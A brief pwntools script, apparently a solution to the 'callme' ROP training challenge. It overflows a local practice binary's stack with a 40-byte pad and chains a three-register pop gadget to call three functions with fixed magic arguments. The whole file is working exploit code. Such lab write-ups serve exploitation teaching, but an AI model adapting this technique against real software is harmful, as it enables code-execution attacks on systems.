from pwn import *

elf = ELF("./callme")

p = process("./callme")
p.recvline()

pop_rdi_pop_rsi_pop_rdx = p64(0x000000000040093c)
args = p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)

payload = b''
payload += pop_rdi_pop_rsi_pop_rdx + args + p64(elf.symbols['callme_one'])
payload += pop_rdi_pop_rsi_pop_rdx + args + p64(elf.symbols['callme_two'])
payload += pop_rdi_pop_rsi_pop_rdx + args + p64(elf.symbols['callme_three'])


p.send(cyclic(40) + payload)
					   

p.interactive()
